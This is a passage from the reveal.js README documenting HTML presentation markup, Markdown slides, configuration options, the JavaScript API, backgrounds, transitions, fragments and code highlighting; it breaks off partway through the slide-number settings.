You can change the port by using `npm start -- --port=8001`.\n\n### Folder Structure\n\n- **css\/** Core styles without which the project does not function\n- **js\/** Like above but for JavaScript\n- **plugin\/** Components that have been developed as extensions to reveal.js\n- **lib\/** All other third party assets (JavaScript, CSS, fonts)\n\n\n## Instructions\n\n### Markup\n\nHere's a barebones example of a fully working reveal.js presentation:\n```html\n<html>\n\t<head>\n\t\t<link rel=\"stylesheet\" href=\"css\/reveal.css\">\n\t\t<link rel=\"stylesheet\" href=\"css\/theme\/white.css\">\n\t<\/head>\n\t<body>\n\t\t<div class=\"reveal\">\n\t\t\t<div class=\"slides\">\n\t\t\t\t<section>Slide 1<\/section>\n\t\t\t\t<section>Slide 2<\/section>\n\t\t\t<\/div>\n\t\t<\/div>\n\t\t<script src=\"js\/reveal.js\"><\/script>\n\t\t<script>\n\t\t\tReveal.initialize();\n\t\t<\/script>\n\t<\/body>\n<\/html>\n```\n\nThe presentation markup hierarchy needs to be `.reveal > .slides > section` where the `section` represents one slide and can be repeated indefinitely. If you place multiple `section` elements inside of another `section` they will be shown as vertical slides. The first of the vertical slides is the \"root\" of the others (at the top), and will be included in the horizontal sequence. For example:\n\n```html\n<div class=\"reveal\">\n\t<div class=\"slides\">\n\t\t<section>Single Horizontal Slide<\/section>\n\t\t<section>\n\t\t\t<section>Vertical Slide 1<\/section>\n\t\t\t<section>Vertical Slide 2<\/section>\n\t\t<\/section>\n\t<\/div>\n<\/div>\n```\n\n### Markdown\n\nIt's possible to write your slides using Markdown. To enable Markdown, add the `data-markdown` attribute to your `<section>` elements and wrap the contents in a `<textarea data-template>` like the example below. You'll also need to add the `plugin\/markdown\/marked.js` and `plugin\/markdown\/markdown.js` scripts (in that order) to your HTML file.\n\nThis is based on [data-markdown](https:\/\/gist.github.com\/1343518) from [Paul Irish](https:\/\/github.com\/paulirish) modified to use [marked](https:\/\/github.com\/chjj\/marked) to support [GitHub Flavored Markdown](https:\/\/help.github.com\/articles\/github-flavored-markdown). Sensitive to indentation (avoid mixing tabs and spaces) and line breaks (avoid consecutive breaks).\n\n```html\n<section data-markdown>\n\t<textarea data-template>\n\t\t## Page title\n\n\t\tA paragraph with some text and a [link](http:\/\/hakim.se).\n\t<\/textarea>\n<\/section>\n```\n\n#### External Markdown\n\nYou can write your content as a separate file and have reveal.js load it at runtime. Note the separator arguments which determine how slides are delimited in the external file: the `data-separator` attribute defines a regular expression for horizontal slides (defaults to `^\\r?\\n---\\r?\\n$`, a newline-bounded horizontal rule)  and `data-separator-vertical` defines vertical slides (disabled by default). The `data-separator-notes` attribute is a regular expression for specifying the beginning of the current slide's speaker notes (defaults to `notes?:`, so it will match both \"note:\" and \"notes:\"). The `data-charset` attribute is optional and specifies which charset to use when loading the external file.\n\nWhen used locally, this feature requires that reveal.js [runs from a local web server](#full-setup).  The following example customises all available options:\n\n```html\n<section data-markdown=\"example.md\"\n         data-separator=\"^\\n\\n\\n\"\n         data-separator-vertical=\"^\\n\\n\"\n         data-separator-notes=\"^Note:\"\n         data-charset=\"iso-8859-15\">\n    <!--\n        Note that Windows uses `\\r\\n` instead of `\\n` as its linefeed character.\n        For a regex that supports all operating systems, use `\\r?\\n` instead of `\\n`.\n    -->\n<\/section>\n```\n\n#### Element Attributes\n\nSpecial syntax (through HTML comments) is available for adding attributes to Markdown elements. This is useful for fragments, amongst other things.\n\n```html\n<section data-markdown>\n\t<script type=\"text\/template\">\n\t\t- Item 1 <!-- .element: class=\"fragment\" data-fragment-index=\"2\" -->\n\t\t- Item 2 <!-- .element: class=\"fragment\" data-fragment-index=\"1\" -->\n\t<\/script>\n<\/section>\n```\n\n#### Slide Attributes\n\nSpecial syntax (through HTML comments) is available for adding attributes to the slide `<section>` elements generated by your Markdown.\n\n```html\n<section data-markdown>\n\t<script type=\"text\/template\">\n\t<!-- .slide: data-background=\"#ff0000\" -->\n\t\tMarkdown content\n\t<\/script>\n<\/section>\n```\n\n#### Configuring *marked*\n\nWe use [marked](https:\/\/github.com\/chjj\/marked) to parse Markdown. To customise marked's rendering, you can pass in options when [configuring Reveal](#configuration):\n\n```javascript\nReveal.initialize({\n\t\/\/ Options which are passed into marked\n\t\/\/ See https:\/\/marked.js.org\/#\/USING_ADVANCED.md#options\n\tmarkdown: {\n\t\tsmartypants: true\n\t}\n});\n```\n\n### Configuration\n\nAt the end of your page you need to initialize reveal by running the following code. Note that all configuration values are optional and will default to the values specified below.\n\n```javascript\nReveal.initialize({\n\n\t\/\/ Display presentation control arrows\n\tcontrols: true,\n\n\t\/\/ Help the user learn the controls by providing hints, for example by\n\t\/\/ bouncing the down arrow when they first encounter a vertical slide\n\tcontrolsTutorial: true,\n\n\t\/\/ Determines where controls appear, \"edges\" or \"bottom-right\"\n\tcontrolsLayout: 'bottom-right',\n\n\t\/\/ Visibility rule for backwards navigation arrows; \"faded\", \"hidden\"\n\t\/\/ or \"visible\"\n\tcontrolsBackArrows: 'faded',\n\n\t\/\/ Display a presentation progress bar\n\tprogress: true,\n\n\t\/\/ Display the page number of the current slide\n\tslideNumber: false,\n\n\t\/\/ Add the current slide number to the URL hash so that reloading the\n\t\/\/ page\/copying the URL will return you to the same slide\n\thash: false,\n\n\t\/\/ Push each slide change to the browser history. Implies `hash: true`\n\thistory: false,\n\n\t\/\/ Enable keyboard shortcuts for navigation\n\tkeyboard: true,\n\n\t\/\/ Enable the slide overview mode\n\toverview: true,\n\n\t\/\/ Vertical centering of slides\n\tcenter: true,\n\n\t\/\/ Enables touch navigation on devices with touch input\n\ttouch: true,\n\n\t\/\/ Loop the presentation\n\tloop: false,\n\n\t\/\/ Change the presentation direction to be RTL\n\trtl: false,\n\n\t\/\/ See https:\/\/github.com\/hakimel\/reveal.js\/#navigation-mode\n\tnavigationMode: 'default',\n\n\t\/\/ Randomizes the order of slides each time the presentation loads\n\tshuffle: false,\n\n\t\/\/ Turns fragments on and off globally\n\tfragments: true,\n\n\t\/\/ Flags whether to include the current fragment in the URL,\n\t\/\/ so that reloading brings you to the same fragment position\n\tfragmentInURL: false,\n\n\t\/\/ Flags if the presentation is running in an embedded mode,\n\t\/\/ i.e. contained within a limited portion of the screen\n\tembedded: false,\n\n\t\/\/ Flags if we should show a help overlay when the questionmark\n\t\/\/ key is pressed\n\thelp: true,\n\n\t\/\/ Flags if speaker notes should be visible to all viewers\n\tshowNotes: false,\n\n\t\/\/ Global override for autoplaying embedded media (video\/audio\/iframe)\n\t\/\/ - null: Media will only autoplay if data-autoplay is present\n\t\/\/ - true: All media will autoplay, regardless of individual setting\n\t\/\/ - false: No media will autoplay, regardless of individual setting\n\tautoPlayMedia: null,\n\n\t\/\/ Global override for preloading lazy-loaded iframes\n\t\/\/ - null: Iframes with data-src AND data-preload will be loaded when within\n\t\/\/   the viewDistance, iframes with only data-src will be loaded when visible\n\t\/\/ - true: All iframes with data-src will be loaded when within the viewDistance\n\t\/\/ - false: All iframes with data-src will be loaded only when visible\n\tpreloadIframes: null,\n\n\t\/\/ Number of milliseconds between automatically proceeding to the\n\t\/\/ next slide, disabled when set to 0, this value can be overwritten\n\t\/\/ by using a data-autoslide attribute on your slides\n\tautoSlide: 0,\n\n\t\/\/ Stop auto-sliding after user input\n\tautoSlideStoppable: true,\n\n\t\/\/ Use this method for navigation when auto-sliding\n\tautoSlideMethod: Reveal.navigateNext,\n\n\t\/\/ Specify the average time in seconds that you think you will spend\n\t\/\/ presenting each slide. This is used to show a pacing timer in the\n\t\/\/ speaker view\n\tdefaultTiming: 120,\n\n\t\/\/ Enable slide navigation via mouse wheel\n\tmouseWheel: false,\n\n\t\/\/ Hide cursor if inactive\n\thideInactiveCursor: true,\n\n\t\/\/ Time before the cursor is hidden (in ms)\n\thideCursorTime: 5000,\n\n\t\/\/ Hides the address bar on mobile devices\n\thideAddressBar: true,\n\n\t\/\/ Opens links in an iframe preview overlay\n\t\/\/ Add `data-preview-link` and `data-preview-link=\"false\"` to customise each link\n\t\/\/ individually\n\tpreviewLinks: false,\n\n\t\/\/ Transition style\n\ttransition: 'slide', \/\/ none\/fade\/slide\/convex\/concave\/zoom\n\n\t\/\/ Transition speed\n\ttransitionSpeed: 'default', \/\/ default\/fast\/slow\n\n\t\/\/ Transition style for full page slide backgrounds\n\tbackgroundTransition: 'fade', \/\/ none\/fade\/slide\/convex\/concave\/zoom\n\n\t\/\/ Number of slides away from the current that are visible\n\tviewDistance: 3,\n\n\t\/\/ Parallax background image\n\tparallaxBackgroundImage: '', \/\/ e.g. \"'https:\/\/s3.amazonaws.com\/hakim-static\/reveal-js\/reveal-parallax-1.jpg'\"\n\n\t\/\/ Parallax background size\n\tparallaxBackgroundSize: '', \/\/ CSS syntax, e.g. \"2100px 900px\"\n\n\t\/\/ Number of pixels to move the parallax background per slide\n\t\/\/ - Calculated automatically unless specified\n\t\/\/ - Set to 0 to disable movement along an axis\n\tparallaxBackgroundHorizontal: null,\n\tparallaxBackgroundVertical: null,\n\n\t\/\/ The display mode that will be used to show slides\n\tdisplay: 'block'\n\n});\n```\n\nThe configuration can be updated after initialization using the `configure` method:\n\n```javascript\n\/\/ Turn autoSlide off\nReveal.configure({ autoSlide: 0 });\n\n\/\/ Start auto-sliding every 5s\nReveal.configure({ autoSlide: 5000 });\n```\n\n### Presentation Size\n\nAll presentations have a normal size, that is, the resolution at which they are authored. The framework will automatically scale presentations uniformly based on this size to ensure that everything fits on any given display or viewport.\n\nSee below for a list of configuration options related to sizing, including default values:\n\n```javascript\nReveal.initialize({\n\n\t\/\/ ...\n\n\t\/\/ The \"normal\" size of the presentation, aspect ratio will be preserved\n\t\/\/ when the presentation is scaled to fit different resolutions. Can be\n\t\/\/ specified using percentage units.\n\twidth: 960,\n\theight: 700,\n\n\t\/\/ Factor of the display size that should remain empty around the content\n\tmargin: 0.1,\n\n\t\/\/ Bounds for smallest\/largest possible scale to apply to content\n\tminScale: 0.2,\n\tmaxScale: 1.5\n\n});\n```\n\nIf you wish to disable this behavior and do your own scaling (e.g. using media queries), try these settings:\n\n```javascript\nReveal.initialize({\n\n\t\/\/ ...\n\n\twidth: \"100%\",\n\theight: \"100%\",\n\tmargin: 0,\n\tminScale: 1,\n\tmaxScale: 1\n});\n```\n\n### Dependencies\n\nReveal.js doesn't _rely_ on any third party scripts to work but a few optional libraries are included by default. These libraries are loaded as dependencies in the order they appear, for example:\n\n```javascript\nReveal.initialize({\n\tdependencies: [\n\t\t\/\/ Interpret Markdown in <section> elements\n\t\t{ src: 'plugin\/markdown\/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },\n\t\t{ src: 'plugin\/markdown\/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },\n\n\t\t\/\/ Syntax highlight for <code> elements\n\t\t{ src: 'plugin\/highlight\/highlight.js', async: true },\n\n\t\t\/\/ Zoom in and out with Alt+click\n\t\t{ src: 'plugin\/zoom-js\/zoom.js', async: true },\n\n\t\t\/\/ Speaker notes\n\t\t{ src: 'plugin\/notes\/notes.js', async: true },\n\n\t\t\/\/ MathJax\n\t\t{ src: 'plugin\/math\/math.js', async: true }\n\t]\n});\n```\n\nYou can add your own extensions using the same syntax. The following properties are available for each dependency object:\n- **src**: Path to the script to load\n- **async**: [optional] Flags if the script should load after reveal.js has started, defaults to false\n- **callback**: [optional] Function to execute when the script has loaded\n- **condition**: [optional] Function which must return true for the script to be loaded\n\n### Ready Event\n\nA `ready` event is fired when reveal.js has loaded all non-async dependencies and is ready to start navigating. To check if reveal.js is already 'ready' you can call `Reveal.isReady()`.\n\n```javascript\nReveal.addEventListener( 'ready', function( event ) {\n\t\/\/ event.currentSlide, event.indexh, event.indexv\n} );\n```\n\nNote that we also add a `.ready` class to the `.reveal` element so that you can hook into this with CSS.\n\n### Auto-sliding\n\nPresentations can be configured to progress through slides automatically, without any user input. To enable this you will need to tell the framework how many milliseconds it should wait between slides:\n\n```javascript\n\/\/ Slide every five seconds\nReveal.configure({\n  autoSlide: 5000\n});\n```\n\nWhen this is turned on a control element will appear that enables users to pause and resume auto-sliding. Alternatively, sliding can be paused or resumed by pressing \u00bbA\u00ab on the keyboard. Sliding is paused automatically as soon as the user starts navigating. You can disable these controls by specifying `autoSlideStoppable: false` in your reveal.js config.\n\nYou can also override the slide duration for individual slides and fragments by using the `data-autoslide` attribute:\n\n```html\n<section data-autoslide=\"2000\">\n\t<p>After 2 seconds the first fragment will be shown.<\/p>\n\t<p class=\"fragment\" data-autoslide=\"10000\">After 10 seconds the next fragment will be shown.<\/p>\n\t<p class=\"fragment\">Now, the fragment is displayed for 2 seconds before the next slide is shown.<\/p>\n<\/section>\n```\n\nTo override the method used for navigation when auto-sliding, you can specify the `autoSlideMethod` setting. To only navigate along the top layer and ignore vertical slides, set this to `Reveal.navigateRight`.\n\nWhenever the auto-slide mode is resumed or paused the `autoslideresumed` and `autoslidepaused` events are fired.\n\n### Keyboard Bindings\n\nIf you're unhappy with any of the default keyboard bindings you can override them using the `keyboard` config option:\n\n```javascript\nReveal.configure({\n  keyboard: {\n    13: 'next', \/\/ go to the next slide when the ENTER key is pressed\n    27: function() {}, \/\/ do something custom when ESC is pressed\n    32: null \/\/ don't do anything when SPACE is pressed (i.e. disable a reveal.js default binding)\n  }\n});\n```\n\n### Vertical Slide Navigation\n\nSlides can be nested within other slides to create vertical stacks (see [Markup](#markup)). When presenting, you use the left\/right arrows to step through the main (horizontal) slides. When you arrive at a vertical stack you can optionally press the up\/down arrows to view the vertical slides or skip past them by pressing the right arrow. Here's an example showing a bird's-eye view of what this looks like in action:\n\n<img src=\"https:\/\/static.slid.es\/support\/reveal.js-vertical-slides.gif\" width=\"450\">\n\n#### Navigation Mode\nYou can finetune the reveal.js navigation behavior by using the `navigationMode` config option. Note that these options are only useful for presnetations that use a mix of horizontal and vertical slides. The following navigation modes are available:\n\n| Value                         | Description |\n| :---------------------------  | :---------- |\n| default                       | Left\/right arrow keys step between horizontal slides. Up\/down arrow keys step between vertical slides. Space key steps through all slides (both horizontal and vertical). |\n| linear                        | Removes the up\/down arrows. Left\/right arrows step through all slides (both horizontal and vertical). |\n| grid                          | When this is enabled, stepping left\/right from a vertical stack to an adjacent vertical stack will land you at the same vertical index.<br><br>Consider a deck with six slides ordered in two vertical stacks:<br>`1.1`&nbsp;&nbsp;&nbsp;&nbsp;`2.1`<br>`1.2`&nbsp;&nbsp;&nbsp;&nbsp;`2.2`<br>`1.3`&nbsp;&nbsp;&nbsp;&nbsp;`2.3`<br><br>If you're on slide 1.3 and navigate right, you will normally move from 1.3 -> 2.1. With navigationMode set to \"grid\" the same navigation takes you from 1.3 -> 2.3. |\n\n### Touch Navigation\n\nYou can swipe to navigate through a presentation on any touch-enabled device. Horizontal swipes change between horizontal slides, vertical swipes change between vertical slides. If you wish to disable this you can set the `touch` config option to false when initializing reveal.js.\n\nIf there's some part of your content that needs to remain accessible to touch events you'll need to highlight this by adding a `data-prevent-swipe` attribute to the element. One common example where this is useful is elements that need to be scrolled.\n\n### Lazy Loading\n\nWhen working on presentation with a lot of media or iframe content it's important to load lazily. Lazy loading means that reveal.js will only load content for the few slides nearest to the current slide. The number of slides that are preloaded is determined by the `viewDistance` configuration option.\n\nTo enable lazy loading all you need to do is change your `src` attributes to `data-src` as shown below. This is supported for image, video, audio and iframe elements.\n\n```html\n<section>\n  <img data-src=\"image.png\">\n  <iframe data-src=\"http:\/\/hakim.se\"><\/iframe>\n  <video>\n    <source data-src=\"video.webm\" type=\"video\/webm\" \/>\n    <source data-src=\"video.mp4\" type=\"video\/mp4\" \/>\n  <\/video>\n<\/section>\n```\n\n#### Lazy Loading Iframes\n\nNote that lazy loaded iframes ignore the `viewDistance` configuration and will only load when their containing slide becomes visible. Iframes are also unloaded as soon as the slide is hidden.\n\nWhen we lazy load a video or audio element, reveal.js won't start playing that content until the slide becomes visible. However there is no way to control this for an iframe since that could contain any kind of content. That means if we loaded an iframe before the slide is visible on screen it could begin playing media and sound in the background.\n\nYou can override this behavior with the `data-preload` attribute. The iframe below will be loaded\naccording to the `viewDistance`.\n\n```html\n<section>\n\t<iframe data-src=\"http:\/\/hakim.se\" data-preload><\/iframe>\n<\/section>\n```\n\nYou can also change the default globally with the `preloadIframes` configuration option. If set to\n`true` ALL iframes with a `data-src` attribute will be preloaded when within the `viewDistance`\nregardless of individual `data-preload` attributes. If set to `false`, all iframes will only be\nloaded when they become visible.\n\n### API\n\nThe `Reveal` object exposes a JavaScript API for controlling navigation and reading state:\n\n```javascript\n\/\/ Navigation\nReveal.slide( indexh, indexv, indexf );\nReveal.left();\nReveal.right();\nReveal.up();\nReveal.down();\nReveal.prev();\nReveal.next();\nReveal.prevFragment();\nReveal.nextFragment();\n\n\/\/ Randomize the order of slides\nReveal.shuffle();\n\n\/\/ Toggle presentation states, optionally pass true\/false to force on\/off\nReveal.toggleOverview();\nReveal.togglePause();\nReveal.toggleAutoSlide();\n\n\/\/ Shows a help overlay with keyboard shortcuts, optionally pass true\/false\n\/\/ to force on\/off\nReveal.toggleHelp();\n\n\/\/ Change a config value at runtime\nReveal.configure({ controls: true });\n\n\/\/ Returns the present configuration options\nReveal.getConfig();\n\n\/\/ Fetch the current scale of the presentation\nReveal.getScale();\n\n\/\/ Retrieves the previous and current slide elements\nReveal.getPreviousSlide();\nReveal.getCurrentSlide();\n\nReveal.getIndices();        \/\/ { h: 0, v: 0, f: 0 }\nReveal.getSlidePastCount();\nReveal.getProgress();       \/\/ (0 == first slide, 1 == last slide)\nReveal.getSlides();         \/\/ Array of all slides\nReveal.getTotalSlides();    \/\/ Total number of slides\n\n\/\/ Returns the speaker notes for the current slide\nReveal.getSlideNotes();\n\n\/\/ State checks\nReveal.isFirstSlide();\nReveal.isLastSlide();\nReveal.isOverview();\nReveal.isPaused();\nReveal.isAutoSliding();\n\n\/\/ Returns the top-level DOM element\ngetRevealElement(); \/\/ <div class=\"reveal\">...<\/div>\n```\n\n### Custom Key Bindings\n\nCustom key bindings can be added and removed using the following Javascript API. Custom key bindings will override the default keyboard bindings, but will in turn be overridden by the user defined bindings in the ``keyboard`` config option.\n\n```javascript\nReveal.addKeyBinding( binding, callback );\nReveal.removeKeyBinding( keyCode );\n```\n\nFor example\n\n```javascript\n\/\/ The binding parameter provides the following properties\n\/\/      keyCode: the keycode for binding to the callback\n\/\/          key: the key label to show in the help overlay\n\/\/  description: the description of the action to show in the help overlay\nReveal.addKeyBinding( { keyCode: 84, key: 'T', description: 'Start timer' }, function() {\n\t\/\/ start timer\n} )\n\n\/\/ The binding parameter can also be a direct keycode without providing the help description\nReveal.addKeyBinding( 82, function() {\n\t\/\/ reset timer\n} )\n```\n\nThis allows plugins to add key bindings directly to Reveal so they can\n\n* make use of Reveal's pre-processing logic for key handling (for example, ignoring key presses when paused); and\n* be included in the help overlay (optional)\n\n### Slide Changed Event\n\nA `slidechanged` event is fired each time the slide is changed (regardless of state). The event object holds the index values of the current slide as well as a reference to the previous and current slide HTML nodes.\n\nSome libraries, like MathJax (see [#226](https:\/\/github.com\/hakimel\/reveal.js\/issues\/226#issuecomment-10261609)), get confused by the transforms and display states of slides. Often times, this can be fixed by calling their update or render function from this callback.\n\n```javascript\nReveal.addEventListener( 'slidechanged', function( event ) {\n\t\/\/ event.previousSlide, event.currentSlide, event.indexh, event.indexv\n} );\n```\n\n### Presentation State\n\nThe presentation's current state can be fetched by using the `getState` method. A state object contains all of the information required to put the presentation back as it was when `getState` was first called. Sort of like a snapshot. It's a simple object that can easily be stringified and persisted or sent over the wire.\n\n```javascript\nReveal.slide( 1 );\n\/\/ we're on slide 1\n\nvar state = Reveal.getState();\n\nReveal.slide( 3 );\n\/\/ we're on slide 3\n\nReveal.setState( state );\n\/\/ we're back on slide 1\n```\n\n### Slide States\n\nIf you set `data-state=\"somestate\"` on a slide `<section>`, \"somestate\" will be applied as a class on the document element when that slide is opened. This allows you to apply broad style changes to the page based on the active slide.\n\nFurthermore you can also listen to these changes in state via JavaScript:\n\n```javascript\nReveal.addEventListener( 'somestate', function() {\n\t\/\/ TODO: Sprinkle magic\n}, false );\n```\n\n### Slide Backgrounds\n\nSlides are contained within a limited portion of the screen by default to allow them to fit any display and scale uniformly. You can apply full page backgrounds outside of the slide area by adding a `data-background` attribute to your `<section>` elements. Four different types of backgrounds are supported: color, image, video and iframe.\n\n#### Color Backgrounds\n\nAll CSS color formats are supported, including hex values, keywords, `rgba()` or `hsl()`.\n\n```html\n<section data-background-color=\"#ff0000\">\n\t<h2>Color<\/h2>\n<\/section>\n```\n\n#### Image Backgrounds\n\nBy default, background images are resized to cover the full page. Available options:\n\n| Attribute                        | Default    | Description |\n| :------------------------------- | :--------- | :---------- |\n| data-background-image            |            | URL of the image to show. GIFs restart when the slide opens. |\n| data-background-size             | cover      | See [background-size](https:\/\/developer.mozilla.org\/docs\/Web\/CSS\/background-size) on MDN.  |\n| data-background-position         | center     | See [background-position](https:\/\/developer.mozilla.org\/docs\/Web\/CSS\/background-position) on MDN. |\n| data-background-repeat           | no-repeat  | See [background-repeat](https:\/\/developer.mozilla.org\/docs\/Web\/CSS\/background-repeat) on MDN. |\n| data-background-opacity          | 1          | Opacity of the background image on a 0-1 scale. 0 is transparent and 1 is fully opaque. |\n\n```html\n<section data-background-image=\"http:\/\/example.com\/image.png\">\n\t<h2>Image<\/h2>\n<\/section>\n<section data-background-image=\"http:\/\/example.com\/image.png\" data-background-size=\"100px\" data-background-repeat=\"repeat\">\n\t<h2>This background image will be sized to 100px and repeated<\/h2>\n<\/section>\n```\n\n#### Video Backgrounds\n\nAutomatically plays a full size video behind the slide.\n\n| Attribute                        | Default | Description |\n| :---------------------------     | :------ | :---------- |\n| data-background-video            |         | A single video source, or a comma separated list of video sources. |\n| data-background-video-loop       | false   | Flags if the video should play repeatedly. |\n| data-background-video-muted      | false   | Flags if the audio should be muted. |\n| data-background-size             | cover   | Use `cover` for full screen and some cropping or `contain` for letterboxing. |\n| data-background-opacity          | 1       | Opacity of the background video on a 0-1 scale. 0 is transparent and 1 is fully opaque. |\n\n```html\n<section data-background-video=\"https:\/\/s3.amazonaws.com\/static.slid.es\/site\/homepage\/v1\/homepage-video-editor.mp4,https:\/\/s3.amazonaws.com\/static.slid.es\/site\/homepage\/v1\/homepage-video-editor.webm\" data-background-video-loop data-background-video-muted>\n\t<h2>Video<\/h2>\n<\/section>\n```\n\n#### Iframe Backgrounds\n\nEmbeds a web page as a slide background that covers 100% of the reveal.js width and height. The iframe is in the background layer, behind your slides, and as such it's not possible to interact with it by default. To make your background interactive, you can add the `data-background-interactive` attribute.\n\n```html\n<section data-background-iframe=\"https:\/\/slides.com\" data-background-interactive>\n\t<h2>Iframe<\/h2>\n<\/section>\n```\n\n#### Background Transitions\n\nBackgrounds transition using a fade animation by default. This can be changed to a linear sliding transition by passing `backgroundTransition: 'slide'` to the `Reveal.initialize()` call. Alternatively you can set `data-background-transition` on any section with a background to override that specific transition.\n\n\n### Parallax Background\n\nIf you want to use a parallax scrolling background, set the first two properties below when initializing reveal.js (the other two are optional).\n\n```javascript\nReveal.initialize({\n\n\t\/\/ Parallax background image\n\tparallaxBackgroundImage: '', \/\/ e.g. \"https:\/\/s3.amazonaws.com\/hakim-static\/reveal-js\/reveal-parallax-1.jpg\"\n\n\t\/\/ Parallax background size\n\tparallaxBackgroundSize: '', \/\/ CSS syntax, e.g. \"2100px 900px\" - currently only pixels are supported (don't use % or auto)\n\n\t\/\/ Number of pixels to move the parallax background per slide\n\t\/\/ - Calculated automatically unless specified\n\t\/\/ - Set to 0 to disable movement along an axis\n\tparallaxBackgroundHorizontal: 200,\n\tparallaxBackgroundVertical: 50\n\n});\n```\n\nMake sure that the background size is much bigger than screen size to allow for some scrolling. [View example](http:\/\/revealjs.com\/?parallaxBackgroundImage=https%3A%2F%2Fs3.amazonaws.com%2Fhakim-static%2Freveal-js%2Freveal-parallax-1.jpg&parallaxBackgroundSize=2100px%20900px).\n\n### Slide Transitions\n\nThe global presentation transition is set using the `transition` config value. You can override the global transition for a specific slide by using the `data-transition` attribute:\n\n```html\n<section data-transition=\"zoom\">\n\t<h2>This slide will override the presentation transition and zoom!<\/h2>\n<\/section>\n\n<section data-transition-speed=\"fast\">\n\t<h2>Choose from three transition speeds: default, fast or slow!<\/h2>\n<\/section>\n```\n\nYou can also use different in and out transitions for the same slide:\n\n```html\n<section data-transition=\"slide\">\n    The train goes on \u2026\n<\/section>\n<section data-transition=\"slide\">\n    and on \u2026\n<\/section>\n<section data-transition=\"slide-in fade-out\">\n    and stops.\n<\/section>\n<section data-transition=\"fade-in slide-out\">\n    (Passengers entering and leaving)\n<\/section>\n<section data-transition=\"slide\">\n    And it starts again.\n<\/section>\n```\nYou can choose from `none`, `fade`, `slide`, `convex`, `concave` and `zoom`.\n### Internal links\n\nIt's easy to link between slides. The first example below targets the index of another slide whereas the second targets a slide with an ID attribute (`<section id=\"some-slide\">`):\n\n```html\n<a href=\"#\/2\/2\">Link<\/a>\n<a href=\"#\/some-slide\">Link<\/a>\n```\n\nYou can also add relative navigation links, similar to the built in reveal.js controls, by appending one of the following classes on any element. Note that each element is automatically given an `enabled` class when it's a valid navigation route based on the current slide.\n\n```html\n<a href=\"#\" class=\"navigate-left\">\n<a href=\"#\" class=\"navigate-right\">\n<a href=\"#\" class=\"navigate-up\">\n<a href=\"#\" class=\"navigate-down\">\n<a href=\"#\" class=\"navigate-prev\"> <!-- Previous vertical or horizontal slide -->\n<a href=\"#\" class=\"navigate-next\"> <!-- Next vertical or horizontal slide -->\n```\n\n### Fragments\n\nFragments are used to highlight individual elements on a slide. Every element with the class `fragment` will be stepped through before moving on to the next slide. Here's an example: http:\/\/revealjs.com\/#\/fragments\n\nThe default fragment style is to start out invisible and fade in. This style can be changed by appending a different class to the fragment:\n\n```html\n<section>\n\t<p class=\"fragment grow\">grow<\/p>\n\t<p class=\"fragment shrink\">shrink<\/p>\n\t<p class=\"fragment fade-out\">fade-out<\/p>\n\t<p class=\"fragment fade-up\">fade-up (also down, left and right!)<\/p>\n\t<p class=\"fragment fade-in-then-out\">fades in, then out when we move to the next step<\/p>\n\t<p class=\"fragment fade-in-then-semi-out\">fades in, then obfuscate when we move to the next step<\/p>\n\t<p class=\"fragment highlight-current-blue\">blue only once<\/p>\n\t<p class=\"fragment highlight-red\">highlight-red<\/p>\n\t<p class=\"fragment highlight-green\">highlight-green<\/p>\n\t<p class=\"fragment highlight-blue\">highlight-blue<\/p>\n<\/section>\n```\n\nMultiple fragments can be applied to the same element sequentially by wrapping it, this will fade in the text on the first step and fade it back out on the second.\n\n```html\n<section>\n\t<span class=\"fragment fade-in\">\n\t\t<span class=\"fragment fade-out\">I'll fade in, then out<\/span>\n\t<\/span>\n<\/section>\n```\n\nThe display order of fragments can be controlled using the `data-fragment-index` attribute.\n\n```html\n<section>\n\t<p class=\"fragment\" data-fragment-index=\"3\">Appears last<\/p>\n\t<p class=\"fragment\" data-fragment-index=\"1\">Appears first<\/p>\n\t<p class=\"fragment\" data-fragment-index=\"2\">Appears second<\/p>\n<\/section>\n```\n\n### Fragment events\n\nWhen a slide fragment is either shown or hidden reveal.js will dispatch an event.\n\nSome libraries, like MathJax (see #505), get confused by the initially hidden fragment elements. Often times this can be fixed by calling their update or render function from this callback.\n\n```javascript\nReveal.addEventListener( 'fragmentshown', function( event ) {\n\t\/\/ event.fragment = the fragment DOM element\n} );\nReveal.addEventListener( 'fragmenthidden', function( event ) {\n\t\/\/ event.fragment = the fragment DOM element\n} );\n```\n\n### Code Syntax Highlighting\n\nBy default, Reveal is configured with [highlight.js](https:\/\/highlightjs.org\/) for code syntax highlighting. To enable syntax highlighting, you'll have to load the highlight plugin ([plugin\/highlight\/highlight.js](plugin\/highlight\/highlight.js)) and a highlight.js CSS theme (Reveal comes packaged with the Monokai themes: [lib\/css\/monokai.css](lib\/css\/monokai.css)).\n\n```javascript\nReveal.initialize({\n\t\/\/ More info https:\/\/github.com\/hakimel\/reveal.js#dependencies\n\tdependencies: [\n\t\t{ src: 'plugin\/highlight\/highlight.js', async: true },\n\t]\n});\n```\n\nBelow is an example with clojure code that will be syntax highlighted. When the `data-trim` attribute is present, surrounding whitespace is automatically removed.  HTML will be escaped by default. To avoid this, for example if you are using `<mark>` to call out a line of code, add the `data-noescape` attribute to the `<code>` element.\n\n```html\n<section>\n\t<pre><code data-trim data-noescape>\n(def lazy-fib\n  (concat\n   [0 1]\n   <mark>((fn rfib [a b]<\/mark>\n        (lazy-cons (+ a b) (rfib b (+ a b)))) 0 1)))\n\t<\/code><\/pre>\n<\/section>\n```\n\n#### Line Numbers & Highlights\n\nTo enable line numbers, add `data-line-numbers` to your `<code>` tags. If you want to highlight specific lines you can provide a comma separated list of line numbers using the same attribute. For example, in the following example lines 4 and 8-11 are highlighted:\n\n```html\n<pre><code class=\"hljs\" data-line-numbers=\"4,8-11\">\nimport React, { useState } from 'react';\n \nfunction Example() {\n  const [count, setCount] = useState(0);\n \n  return (\n    <div>\n      <p>You clicked {count} times<\/p>\n      <button onClick={() => setCount(count + 1)}>\n        Click me\n      <\/button>\n    <\/div>\n  );\n}\n<\/code><\/pre>\n```\n\n<img width=\"300\" alt=\"line-numbers\" src=\"https:\/\/user-images.githubusercontent.com\/629429\/55332077-eb3c4780-5494-11e9-8854-ba33cd0fa740.png\">\n\n\n\n### Slide number\n\nIf you would like to display the page number of the current slide you can do so using the `slideNumber` and `showSlideNumber` configuration values.\n\n```javascript\n\/\/ Shows the slide number using default formatting\nReveal.configure({ slideNumber: true });\n\n\/\/ Slide number formatting can be configured using these variables:\n\/\/  \"h.v\": \thorizontal . vertical slide number (default)\n\/\/  \"h\/v\": \thorizontal \/ vertical slide number\n\/\/    \"c\": \tflattened slide number\n\/\/  \"c\/t\": 